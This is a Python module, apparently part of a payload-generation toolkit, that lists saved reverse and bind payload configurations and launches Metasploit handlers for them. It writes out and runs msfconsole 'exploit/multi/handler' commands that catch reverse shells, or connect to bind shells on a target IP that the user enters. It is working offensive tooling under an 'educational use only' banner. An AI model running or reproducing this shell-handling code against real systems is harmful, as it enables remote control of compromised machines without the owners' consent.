"""
Manage Payload Module - Manage and connect to generated payloads
"""

import os
import json
import glob
import subprocess
import socket
import threading
import time
from .colors import Colors
from .exit_handler import ExitHandler

class ManagePayload:
    def __init__(self):
        self.colors = Colors()
        self.exit_handler = ExitHandler()
        self.config_dir = "payload_configs"
        self.handler_dir = "handlers"
        self.reverse_payloads = []
        self.bind_payloads = []
        self.ensure_handler_dir()
        self.load_payload_configs()

    def ensure_handler_dir(self):
        """Ensure the handler directory exists"""
        if not os.path.exists(self.handler_dir):
            os.makedirs(self.handler_dir)

    def load_payload_configs(self):
        """Load all payload configuration files"""
        self.reverse_payloads = []
        self.bind_payloads = []
        
        if not os.path.exists(self.config_dir):
            return
        
        config_files = glob.glob(os.path.join(self.config_dir, "*.json"))
        
        for config_file in config_files:
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                
                # Check if it's a reverse payload (has LHOST and LPORT)
                if 'LHOST' in config.get('parameters', {}) and 'LPORT' in config.get('parameters', {}):
                    self.reverse_payloads.append({
                        'config_file': config_file,
                        'config': config,
                        'display_name': f"{config['platform']} - {config['payload']['name']} ({config['parameters']['LHOST']}:{config['parameters']['LPORT']})"
                    })
                
                # Check if it's a bind payload (only has LPORT)
                elif 'LPORT' in config.get('parameters', {}) and 'LHOST' not in config.get('parameters', {}):
                    self.bind_payloads.append({
                        'config_file': config_file,
                        'config': config,
                        'display_name': f"{config['platform']} - {config['payload']['name']} (Port: {config['parameters']['LPORT']})"
                    })
                    
            except Exception as e:
                print(f"{self.colors.BRIGHT_RED}❌ Error loading config {config_file}: {e}{self.colors.RESET}")

    def display_banner(self):
        """Display the Manage Payload banner"""
        ascii_art = f"""
{self.colors.CYAN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⡴⠾⠟⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠷⢦⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠋⠁⠀⠀⢀⣀⣤⣶⣖⣒⣒⡲⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⢖⣒⣒⣲⣶⣤⣀⡀⠀⠀⠈⠙⠂⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⢖⣫⣷⣿⣿⣿⣿⣿⣿⣶⣤⡙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢋⣤⣾⣿⣿⣿⣿⣿⣿⣾⣝⡲⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣄⣀⣠⢿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠻⢿⣿⣿⣦⣳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣟⣴⣿⣿⡿⠟⠻⢿⣿⣿⣿⣿⣿⣿⣿⡻⣄⣀⣤⠀⠀⠀
⠀⠀⠀⠈⠟⣿⣿⣿⡿⢻⣿⣿⣿⠃⠀⠀⠀⠀⠙⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⣿⣿⣿⠋⠀⠀⠀⠀⠘⣿⣿⣿⡟⢿⣿⣿⣟⠻⠁⠀⠀⠀
⠤⣤⣶⣶⣿⣿⣿⡟⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⣹⣿⣿⣷⠈⢻⣿⣿⣿⣶⣦⣤⠤
⠀⠀⠀⠀⠀⢻⣟⠀⠀⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠀⠀⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣆⠀⢹⣿⠟⢿⣿⣦⣤⣤⣴⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⢷⣤⣤⣤⣴⣿⣿⣿⣿⡇⠀⣰⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠙⢀⣀⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠁⠀⣻⣿⣿⣿⣿⣿⣿⠏⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡈⠻⠿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢿⣿⣿⣿⠿⠛⢁⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⣶⣦⣤⣤⣤⡤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢤⣤⣤⣤⣶⣾⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{self.colors.RESET}"""

        banner = f"""
{ascii_art}

{self.colors.GREEN}Created by: {self.colors.YELLOW}@apt_start_latifi / iddox{self.colors.RESET}
{self.colors.GREEN}Website: {self.colors.BLUE}https://www.iddox.tech/{self.colors.RESET}
{self.colors.GREEN}Discord: {self.colors.BLUE}https://discord.gg/KcuMUUAP5T{self.colors.RESET}
{self.colors.GREEN}Mail: {self.colors.BLUE}latifimods@gmail.com{self.colors.RESET}

{self.colors.RED}WARNING  WARNING: Educational and testing purposes only!{self.colors.RESET}
{self.colors.RED}WARNING  Use only in isolated environments with proper authorization!{self.colors.RESET}
{self.colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                   {self.colors.YELLOW}Payload Management System{self.colors.CYAN}                  ║
║                    {self.colors.RED}Educational Use Only{self.colors.CYAN}                      ║
╚══════════════════════════════════════════════════════════════╝{self.colors.RESET}
"""
        print(banner)

    def display_main_menu(self):
        """Display the main management menu"""
        menu = f"""
{self.colors.BRIGHT_RED}╔══════════════════════════════════════════════════════════════╗
║                    {self.colors.BRIGHT_YELLOW}🎯 PAYLOAD MANAGEMENT 🎯{self.colors.BRIGHT_RED}                  ║
╠══════════════════════════════════════════════════════════════╣
║  {self.colors.BRIGHT_GREEN}1.{self.colors.RESET} {self.colors.BRIGHT_YELLOW}🔄 Connect with TCP Reverse{self.colors.RESET}                              ║
║  {self.colors.BRIGHT_GREEN}2.{self.colors.RESET} {self.colors.BRIGHT_MAGENTA}🔗 Connect with TCP Bind{self.colors.RESET}                                 ║
║  {self.colors.BRIGHT_GREEN}3.{self.colors.RESET} {self.colors.BRIGHT_RED}🚪 Exit{self.colors.RESET}                                                  ║
╚══════════════════════════════════════════════════════════════╝{self.colors.RESET}
"""
        print(menu)

    def display_reverse_payloads_menu(self):
        """Display available reverse payloads"""
        if not self.reverse_payloads:
            print(f"\n{self.colors.BRIGHT_RED}❌ No reverse payloads found!{self.colors.RESET}")
            print(f"{self.colors.BRIGHT_YELLOW}💡 Create some reverse payloads first using the Create Payload menu.{self.colors.RESET}")
            return 0
        
        menu = f"""
{self.colors.BRIGHT_RED}╔══════════════════════════════════════════════════════════════╗
║                  {self.colors.BRIGHT_YELLOW}🔄 REVERSE PAYLOADS AVAILABLE 🔄{self.colors.BRIGHT_RED}              ║
╠══════════════════════════════════════════════════════════════╣"""
        
        option_num = 1
        colors_list = [self.colors.BRIGHT_YELLOW, self.colors.BRIGHT_MAGENTA, self.colors.BRIGHT_CYAN, self.colors.BRIGHT_BLUE, self.colors.BRIGHT_GREEN, self.colors.BRIGHT_WHITE]
        
        for payload in self.reverse_payloads:
            color = colors_list[(option_num - 1) % len(colors_list)]
            display_text = payload['display_name'][:50]  # Truncate if too long
            menu += f"\n║  {self.colors.BRIGHT_GREEN}{option_num}.{self.colors.RESET} {color}{display_text}{self.colors.RESET}"
            # Add spacing to align with box
            spaces_needed = 50 - len(display_text)
            menu += " " * spaces_needed + "║"
            option_num += 1
        
        menu += f"""
║  {self.colors.BRIGHT_GREEN}{option_num}.{self.colors.RESET} {self.colors.BRIGHT_RED}🚪 Back to Main Menu{self.colors.RESET}                      ║
╚══════════════════════════════════════════════════════════════╝{self.colors.RESET}
"""
        print(menu)
        return len(self.reverse_payloads) + 1

    def display_bind_payloads_menu(self):
        """Display available bind payloads"""
        if not self.bind_payloads:
            print(f"\n{self.colors.BRIGHT_RED}❌ No bind payloads found!{self.colors.RESET}")
            print(f"{self.colors.BRIGHT_YELLOW}💡 Create some bind payloads first using the Create Payload menu.{self.colors.RESET}")
            return 0
        
        menu = f"""
{self.colors.BRIGHT_RED}╔══════════════════════════════════════════════════════════════╗
║                  {self.colors.BRIGHT_YELLOW}🔗 BIND PAYLOADS AVAILABLE 🔗{self.colors.BRIGHT_RED}                ║
╠══════════════════════════════════════════════════════════════╣"""
        
        option_num = 1
        colors_list = [self.colors.BRIGHT_YELLOW, self.colors.BRIGHT_MAGENTA, self.colors.BRIGHT_CYAN, self.colors.BRIGHT_BLUE, self.colors.BRIGHT_GREEN, self.colors.BRIGHT_WHITE]
        
        for payload in self.bind_payloads:
            color = colors_list[(option_num - 1) % len(colors_list)]
            display_text = payload['display_name'][:50]  # Truncate if too long
            menu += f"\n║  {self.colors.BRIGHT_GREEN}{option_num}.{self.colors.RESET} {color}{display_text}{self.colors.RESET}"
            # Add spacing to align with box
            menu += " " * (50 - len(display_text)) + "║"
            option_num += 1
        
        menu += f"""
║  {self.colors.BRIGHT_GREEN}{option_num}.{self.colors.RESET} {self.colors.BRIGHT_RED}🚪 Back to Main Menu{self.colors.RESET}                      ║
╚══════════════════════════════════════════════════════════════╝{self.colors.RESET}
"""
        print(menu)
        return len(self.bind_payloads) + 1

    def get_user_choice(self, max_choice):
        """Get user input for menu choice"""
        while True:
            try:
                choice = input(f"{self.colors.BRIGHT_YELLOW}🎯 Enter your choice (1-{max_choice}): {self.colors.RESET}")
                if choice.isdigit() and 1 <= int(choice) <= max_choice:
                    return int(choice)
                else:
                    print(f"{self.colors.BRIGHT_RED}❌ Invalid choice! Please enter a number between 1-{max_choice}.{self.colors.RESET}")
            except KeyboardInterrupt:
                print(f"\n{self.colors.BRIGHT_YELLOW}WARNING  Operation cancelled by user.{self.colors.RESET}")
                return max_choice
            except Exception as e:
                print(f"{self.colors.BRIGHT_RED}💥 Error: {e}{self.colors.RESET}")

    def validate_ip(self, ip):
        """Basic IP address validation"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            for part in parts:
                if not 0 <= int(part) <= 255:
                    return False
            return True
        except:
            return False

    def start_reverse_handler(self, payload_info):
        """Start Metasploit handler for reverse payload"""
        config = payload_info['config']
        params = config['parameters']
        payload_name = config['payload']['payload_name']
        lhost = params['LHOST']
        lport = params['LPORT']
        
        print(f"\n{self.colors.BRIGHT_CYAN}🚀 Starting Metasploit Handler for Reverse Payload...{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_YELLOW}📋 Payload: {self.colors.BRIGHT_WHITE}{payload_name}{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_YELLOW}🌐 LHOST: {self.colors.BRIGHT_WHITE}{lhost}{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_YELLOW}🔌 LPORT: {self.colors.BRIGHT_WHITE}{lport}{self.colors.RESET}")
        
        # Create msfconsole commands
        msf_commands = f"use exploit/multi/handler; set payload {payload_name}; set LHOST {lhost}; set LPORT {lport}; exploit -j"
        
        print(f"\n{self.colors.BRIGHT_GREEN}✅ Metasploit Handler Commands:{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_WHITE}{msf_commands}{self.colors.RESET}")
        
        # Save commands to file (formatted version)
        commands_file = os.path.join(self.handler_dir, f"handler_commands_{int(time.time())}.txt")
        formatted_commands = f"""use exploit/multi/handler
set payload {payload_name}
set LHOST {lhost}
set LPORT {lport}
exploit -j
"""
        with open(commands_file, 'w') as f:
            f.write(formatted_commands)
        
        print(f"{self.colors.BRIGHT_CYAN}💾 Commands saved to: {self.colors.BRIGHT_WHITE}{commands_file}{self.colors.RESET}")
        
        # Ask if user wants to start handler
        start_handler = input(f"\n{self.colors.BRIGHT_YELLOW}🚀 Start Metasploit handler now? (y/N): {self.colors.RESET}").strip().lower()
        
        if start_handler in ['y', 'yes']:
            try:
                print(f"\n{self.colors.BRIGHT_CYAN}🎧 Starting Metasploit handler...{self.colors.RESET}")
                print(f"{self.colors.BRIGHT_YELLOW}💡 Press Ctrl+C to stop the handler{self.colors.RESET}")
                
                # Start msfconsole with commands
                cmd = ['msfconsole', '-q', '-x', msf_commands]
                subprocess.run(cmd)
                
            except KeyboardInterrupt:
                print(f"\n{self.colors.BRIGHT_YELLOW}WARNING  Handler stopped by user.{self.colors.RESET}")
            except Exception as e:
                print(f"\n{self.colors.BRIGHT_RED}❌ Error starting handler: {e}{self.colors.RESET}")
        else:
            print(f"\n{self.colors.BRIGHT_CYAN}💡 You can start the handler manually using the saved commands.{self.colors.RESET}")

    def start_bind_handler(self, payload_info):
        """Start connection to bind payload"""
        config = payload_info['config']
        params = config['parameters']
        payload_name = config['payload']['payload_name']
        lport = params['LPORT']
        
        print(f"\n{self.colors.BRIGHT_CYAN}🚀 Connecting to Bind Payload...{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_YELLOW}📋 Payload: {self.colors.BRIGHT_WHITE}{payload_name}{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_YELLOW}🔌 LPORT: {self.colors.BRIGHT_WHITE}{lport}{self.colors.RESET}")
        
        # Get target IP from user
        print(f"\n{self.colors.BRIGHT_CYAN}🎯 Target Configuration:{self.colors.RESET}")
        while True:
            rhost = input(f"{self.colors.BRIGHT_YELLOW}🎯 Enter target IP address (RHOST): {self.colors.RESET}").strip()
            if self.validate_ip(rhost):
                break
            else:
                print(f"{self.colors.BRIGHT_RED}❌ Invalid IP address format!{self.colors.RESET}")
        
        print(f"{self.colors.BRIGHT_YELLOW}🎯 RHOST: {self.colors.BRIGHT_WHITE}{rhost}{self.colors.RESET}")
        
        # Create msfconsole commands for bind connection
        msf_commands = f"use exploit/multi/handler; set payload {payload_name}; set RHOST {rhost}; set LPORT {lport}; exploit"
        
        print(f"\n{self.colors.BRIGHT_GREEN}✅ Metasploit Bind Connection Commands:{self.colors.RESET}")
        print(f"{self.colors.BRIGHT_WHITE}{msf_commands}{self.colors.RESET}")
        
        # Save commands to file (formatted version)
        commands_file = os.path.join(self.handler_dir, f"bind_commands_{int(time.time())}.txt")
        formatted_commands = f"""use exploit/multi/handler
set payload {payload_name}
set RHOST {rhost}
set LPORT {lport}
exploit
"""
        with open(commands_file, 'w') as f:
            f.write(formatted_commands)
        
        print(f"{self.colors.BRIGHT_CYAN}💾 Commands saved to: {self.colors.BRIGHT_WHITE}{commands_file}{self.colors.RESET}")
        
        # Ask if user wants to start connection
        start_connection = input(f"\n{self.colors.BRIGHT_YELLOW}🚀 Connect to bind payload now? (y/N): {self.colors.RESET}").strip().lower()
        
        if start_connection in ['y', 'yes']:
            try:
                print(f"\n{self.colors.BRIGHT_CYAN}🔗 Connecting to bind payload...{self.colors.RESET}")
                print(f"{self.colors.BRIGHT_YELLOW}💡 Press Ctrl+C to stop the connection{self.colors.RESET}")
                
                # Start msfconsole with commands
                cmd = ['msfconsole', '-q', '-x', msf_commands]
                subprocess.run(cmd)
                
            except KeyboardInterrupt:
                print(f"\n{self.colors.BRIGHT_YELLOW}WARNING  Connection stopped by user.{self.colors.RESET}")
            except Exception as e:
                print(f"\n{self.colors.BRIGHT_RED}❌ Error connecting to bind payload: {e}{self.colors.RESET}")
        else:
            print(f"\n{self.colors.BRIGHT_CYAN}💡 You can connect manually using the saved commands.{self.colors.RESET}")


    def run(self):
        """Main Manage Payload function"""
        try:
            print(f"{self.colors.BRIGHT_CYAN}🚀 Starting Payload Management System...{self.colors.RESET}")
            
            while True:
                # Clear screen and display banner
                os.system('clear' if os.name == 'posix' else 'cls')
                self.display_banner()
                
                # Reload payload configs
                self.load_payload_configs()
                
                # Display statistics
                print(f"\n{self.colors.BRIGHT_CYAN}📊 Payload Statistics:{self.colors.RESET}")
                print(f"  {self.colors.BRIGHT_YELLOW}🔄 Reverse Payloads: {self.colors.BRIGHT_WHITE}{len(self.reverse_payloads)}{self.colors.RESET}")
                print(f"  {self.colors.BRIGHT_YELLOW}🔗 Bind Payloads: {self.colors.BRIGHT_WHITE}{len(self.bind_payloads)}{self.colors.RESET}")
                print(f"  {self.colors.BRIGHT_YELLOW}📁 Total Configs: {self.colors.BRIGHT_WHITE}{len(self.reverse_payloads) + len(self.bind_payloads)}{self.colors.RESET}")
                
                # Display main menu
                self.display_main_menu()
                choice = self.get_user_choice(3)
                
                if choice == 1:  # Connect with TCP Reverse
                    max_choice = self.display_reverse_payloads_menu()
                    if max_choice > 0:
                        payload_choice = self.get_user_choice(max_choice)
                        if payload_choice < max_choice:
                            selected_payload = self.reverse_payloads[payload_choice - 1]
                            self.start_reverse_handler(selected_payload)
                    
                elif choice == 2:  # Connect with TCP Bind
                    max_choice = self.display_bind_payloads_menu()
                    if max_choice > 0:
                        payload_choice = self.get_user_choice(max_choice)
                        if payload_choice < max_choice:
                            selected_payload = self.bind_payloads[payload_choice - 1]
                            self.start_bind_handler(selected_payload)
                    
                elif choice == 3:  # Exit
                    print(f"\n{self.colors.BRIGHT_GREEN}🏁 Exiting Payload Management System...{self.colors.RESET}")
                    break
            
            print(f"\n{self.colors.BRIGHT_GREEN}✅ Payload Management completed!{self.colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{self.colors.BRIGHT_YELLOW}⚠️  Application interrupted by user.{self.colors.RESET}")
            self.exit_handler.clean_exit(force=True)
        except Exception as e:
            print(f"{self.colors.BRIGHT_RED}💥 Fatal error in payload management: {e}{self.colors.RESET}")
            self.exit_handler.clean_exit(force=True)
